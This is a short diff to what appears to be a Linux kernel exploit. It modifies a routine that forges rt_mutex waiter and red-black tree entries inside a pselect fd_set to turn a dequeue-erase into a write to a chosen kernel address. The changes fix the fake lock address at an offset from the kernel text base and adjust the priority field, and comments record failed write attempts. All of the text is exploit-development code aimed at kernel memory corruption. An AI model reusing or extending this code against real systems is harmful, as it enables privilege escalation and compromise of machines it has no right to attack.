@@ -1998,8 +1998,10 @@ void do_pselect_fake_lock_route(void) {
         w0 = (ztgt - 8) & ~3ULL; /* red parent = target-8 */
         w1 = val;                 /* right child = VALUE (the write) */
         w2 = 0;
-        wlock = data_addr(KIMAGE_TEXT_BASE + ezp_off + 0x200 +
-                          (uint64_t)(g_resurge_rot ? g_resurge_rot : 1) * 8);
+        /* EZP4: SAME lock as settle (tree persists across attempts —
+         * rotating to a fresh empty tree means the dequeue finds
+         * nothing to erase). prio=3 (W1's proven delta value). */
+        wlock = data_addr(KIMAGE_TEXT_BASE + ezp_off + 0x100);
         pr_info("RESURGE fdset WRITE rot=%d w0=%016llx w1=%016llx "
                 "lock2=%016llx\n",
                 g_resurge_rot, (unsigned long long)w0,
@@ -2022,7 +2024,8 @@ void do_pselect_fake_lock_route(void) {
        * the dequeue-erase silently no-ops (EZP2: 11 writes, 0 landed). */
       pselect_put_waiter_word(&in, &out, &ex, wps, 6, dead_task, "rtask");
       pselect_put_waiter_word(&in, &out, &ex, wps, 7, wlock, "rlock");
-      pselect_put_waiter_word(&in, &out, &ex, wps, 8, 0, "rprio");
+      pselect_put_waiter_word(&in, &out, &ex, wps, 8,
+                              g_resurge_stage == 2 ? 3 : 0, "rprio");
       pselect_put_waiter_word(&in, &out, &ex, wps, 9, 0, "rdl");
     }
     /*
